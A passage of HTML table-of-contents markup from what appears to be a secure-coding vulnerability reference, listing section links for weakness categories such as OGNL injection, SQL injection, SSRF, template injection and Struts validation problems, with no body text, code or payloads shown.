class="toc-number">1.6.50.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-299"><span class="toc-number">1.6.50.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection-Double-Evaluation"><span class="toc-number">1.6.51.</span> <span class="toc-text">OGNL Expression Injection: Double Evaluation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-301"><span class="toc-number">1.6.51.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-302"><span class="toc-number">1.6.51.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-301"><span class="toc-number">1.6.51.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-300"><span class="toc-number">1.6.51.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection-Dynamic-Method-Invocation"><span class="toc-number">1.6.52.</span> <span class="toc-text">OGNL Expression Injection: Dynamic Method Invocation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-302"><span class="toc-number">1.6.52.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-303"><span class="toc-number">1.6.52.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-302"><span class="toc-number">1.6.52.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-301"><span class="toc-number">1.6.52.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection-Struts-2"><span class="toc-number">1.6.53.</span> <span class="toc-text">OGNL Expression Injection: Struts 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-303"><span class="toc-number">1.6.53.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-304"><span class="toc-number">1.6.53.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-303"><span class="toc-number">1.6.53.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-302"><span class="toc-number">1.6.53.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Open-Redirect"><span class="toc-number">1.6.54.</span> <span class="toc-text">Open Redirect</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-304"><span class="toc-number">1.6.54.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-305"><span class="toc-number">1.6.54.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-304"><span class="toc-number">1.6.54.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-303"><span class="toc-number">1.6.54.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation"><span class="toc-number">1.6.55.</span> <span class="toc-text">Path Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-305"><span class="toc-number">1.6.55.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-306"><span class="toc-number">1.6.55.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-305"><span class="toc-number">1.6.55.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-304"><span class="toc-number">1.6.55.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation-Zip-Entry-Overwrite"><span class="toc-number">1.6.56.</span> <span class="toc-text">Path Manipulation: Zip Entry Overwrite</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-306"><span class="toc-number">1.6.56.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-307"><span class="toc-number">1.6.56.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-306"><span class="toc-number">1.6.56.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-305"><span class="toc-number">1.6.56.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Control"><span class="toc-number">1.6.57.</span> <span class="toc-text">Process Control</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-307"><span class="toc-number">1.6.57.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-308"><span class="toc-number">1.6.57.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-307"><span class="toc-number">1.6.57.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-306"><span class="toc-number">1.6.57.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Control-Invoker-Servlet"><span class="toc-number">1.6.58.</span> <span class="toc-text">Process Control: Invoker Servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-308"><span class="toc-number">1.6.58.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-309"><span class="toc-number">1.6.58.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-308"><span class="toc-number">1.6.58.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-307"><span class="toc-number">1.6.58.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Query-String-Injection-Amazon-Web-Services"><span class="toc-number">1.6.59.</span> <span class="toc-text">Query String Injection: Amazon Web Services</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-309"><span class="toc-number">1.6.59.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-310"><span class="toc-number">1.6.59.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-309"><span class="toc-number">1.6.59.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Query-String-Injection-Android-Provider"><span class="toc-number">1.6.60.</span> <span class="toc-text">Query String Injection: Android Provider</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-310"><span class="toc-number">1.6.60.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-311"><span class="toc-number">1.6.60.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-310"><span class="toc-number">1.6.60.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-308"><span class="toc-number">1.6.60.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected-File-Download"><span class="toc-number">1.6.61.</span> <span class="toc-text">Reflected File Download</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-311"><span class="toc-number">1.6.61.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-312"><span class="toc-number">1.6.61.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-309"><span class="toc-number">1.6.61.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Resource-Injection"><span class="toc-number">1.6.62.</span> <span class="toc-text">Resource Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-312"><span class="toc-number">1.6.62.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-313"><span class="toc-number">1.6.62.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-311"><span class="toc-number">1.6.62.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-310"><span class="toc-number">1.6.62.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">1.6.63.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-313"><span class="toc-number">1.6.63.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-314"><span class="toc-number">1.6.63.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-312"><span class="toc-number">1.6.63.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-311"><span class="toc-number">1.6.63.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Hibernate"><span class="toc-number">1.6.64.</span> <span class="toc-text">SQL Injection: Hibernate</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-314"><span class="toc-number">1.6.64.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-315"><span class="toc-number">1.6.64.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-313"><span class="toc-number">1.6.64.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-312"><span class="toc-number">1.6.64.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-JDO"><span class="toc-number">1.6.65.</span> <span class="toc-text">SQL Injection: JDO</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-315"><span class="toc-number">1.6.65.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-316"><span class="toc-number">1.6.65.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-314"><span class="toc-number">1.6.65.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-313"><span class="toc-number">1.6.65.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-MyBatis-Mapper"><span class="toc-number">1.6.66.</span> <span class="toc-text">SQL Injection: MyBatis Mapper</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-316"><span class="toc-number">1.6.66.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-317"><span class="toc-number">1.6.66.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-315"><span class="toc-number">1.6.66.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-314"><span class="toc-number">1.6.66.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Persistence"><span class="toc-number">1.6.67.</span> <span class="toc-text">SQL Injection: Persistence</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-317"><span class="toc-number">1.6.67.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-318"><span class="toc-number">1.6.67.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-316"><span class="toc-number">1.6.67.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-315"><span class="toc-number">1.6.67.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-iBatis-Data-Map"><span class="toc-number">1.6.68.</span> <span class="toc-text">SQL Injection: iBatis Data Map</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-318"><span class="toc-number">1.6.68.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-319"><span class="toc-number">1.6.68.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-317"><span class="toc-number">1.6.68.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-316"><span class="toc-number">1.6.68.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Request-Forgery"><span class="toc-number">1.6.69.</span> <span class="toc-text">Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-319"><span class="toc-number">1.6.69.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-320"><span class="toc-number">1.6.69.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-318"><span class="toc-number">1.6.69.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-317"><span class="toc-number">1.6.69.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Template-Injection"><span class="toc-number">1.6.70.</span> <span class="toc-text">Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-320"><span class="toc-number">1.6.70.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-321"><span class="toc-number">1.6.70.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-319"><span class="toc-number">1.6.70.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-318"><span class="toc-number">1.6.70.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Session-Puzzling-Spring"><span class="toc-number">1.6.71.</span> <span class="toc-text">Session Puzzling: Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-321"><span class="toc-number">1.6.71.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-322"><span class="toc-number">1.6.71.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-320"><span class="toc-number">1.6.71.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-319"><span class="toc-number">1.6.71.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation"><span class="toc-number">1.6.72.</span> <span class="toc-text">Setting Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-322"><span class="toc-number">1.6.72.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-323"><span class="toc-number">1.6.72.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-321"><span class="toc-number">1.6.72.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-320"><span class="toc-number">1.6.72.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-Beans-Injection"><span class="toc-number">1.6.73.</span> <span class="toc-text">Spring Beans Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-323"><span class="toc-number">1.6.73.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-324"><span class="toc-number">1.6.73.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-322"><span class="toc-number">1.6.73.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-321"><span class="toc-number">1.6.73.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Action-Field-Without-Validator"><span class="toc-number">1.6.74.</span> <span class="toc-text">Struts 2: Action Field Without Validator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-324"><span class="toc-number">1.6.74.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-325"><span class="toc-number">1.6.74.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-323"><span class="toc-number">1.6.74.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-322"><span class="toc-number">1.6.74.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Duplicate-Action-Field-Validators"><span class="toc-number">1.6.75.</span> <span class="toc-text">Struts 2: Duplicate Action Field Validators</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-325"><span class="toc-number">1.6.75.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-326"><span class="toc-number">1.6.75.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-324"><span class="toc-number">1.6.75.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-323"><span class="toc-number">1.6.75.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Duplicate-Validation-Files"><span class="toc-number">1.6.76.</span> <span class="toc-text">Struts 2: Duplicate Validation Files</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-326"><span class="toc-number">1.6.76.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-327"><span class="toc-number">1.6.76.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-325"><span class="toc-number">1.6.76.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-324"><span class="toc-number">1.6.76.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Duplicate-Validators"><span class="toc-number">1.6.77.</span> <span class="toc-text">Struts 2: Duplicate Validators</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-327"><span class="toc-number">1.6.77.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-328"><span class="toc-number">1.6.77.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-326"><span class="toc-number">1.6.77.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-325"><span class="toc-number">1.6.77.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Undeclared-Validator"><span class="toc-number">1.6.78.</span> <span class="toc-text">Struts 2: Undeclared Validator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-328"><span class="toc-number">1.6.78.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-329"><span class="toc-number">1.6.78.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-327"><span class="toc-number">1.6.78.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-326"><span class="toc-number">1.6.78.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Unvalidated-Action"><span class="toc-number">1.6.79.</span> <span class="toc-text">Struts 2: Unvalidated Action</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-329"><span class="toc-number">1.6.79.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-330"><span class="toc-number">1.6.79.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-328"><span class="toc-number">1.6.79.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-327"><span class="toc-number">1.6.79.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Validation-File-Without-Action"><span class="toc-number">1.6.80.</span> <span class="toc-text">Struts 2: Validation File Without Action</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-330"><span class="toc-number">1.6.80.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-331"><span class="toc-number">1.6.80.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-329"><span class="toc-number">1.6.80.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-328"><span class="toc-number">1.6.80.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Validator-Without-Action-Field"><span class="toc-number">1.6.81.</span> <span class="toc-text">Struts 2: Validator Without Action Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-331"><span class="toc-number">1.6.81.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-332"><span class="toc-number">1.6.81.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-330"><span class="toc-number">1.6.81.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-329"><span class="toc-number">1.6.81.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Duplicate-Validation-Forms"><span class="toc-number">1.6.82.</span> <span class="toc-text">Struts: Duplicate Validation Forms</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-332"><span class="toc-number">1.6.82.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-333"><span class="toc-number">1.6.82.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-331"><span class="toc-number">1.6.82.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-330"><span class="toc-number">1.6.82.4.</span> <span class="toc-text">REFERENCES</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-333"><span class="toc-number">1.6.82.5.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-332"><span class="toc-number">1.6.82.6.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-331"><span class="toc-number">1.6.82.7.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Form-Does-Not-Extend-Validation-Class"><span class="toc-number">1.6.83.</span> <span class="toc-text">Struts: Form Does Not Extend Validation Class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-334"><span class="toc-number">1.6.83.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-334"><span class="toc-number">1.6.83.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-333"><span class="toc-number">1.6.83.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-332"><span class="toc-number">1.6.83.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Form-Field-Without-Validator"><span class="toc-number">1.6.84.</span> <span class="toc-text">Struts: Form Field Without Validator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-335"><span class="toc-number">1.6.84.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-335"><span class="toc-number">1.6.84.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-334"><span class="toc-number">1.6.84.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-333"><span class="toc-number">1.6.84.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Plugin-Framework-Not-In-Use"><span class="toc-number">1.6.85.</span> <span class="toc-text">Struts: Plugin Framework Not In Use</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-336"><span class="toc-number">1.6.85.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-336"><span class="toc-number">1.6.85.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-335"><span class="toc-number">1.6.85.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-334"><span 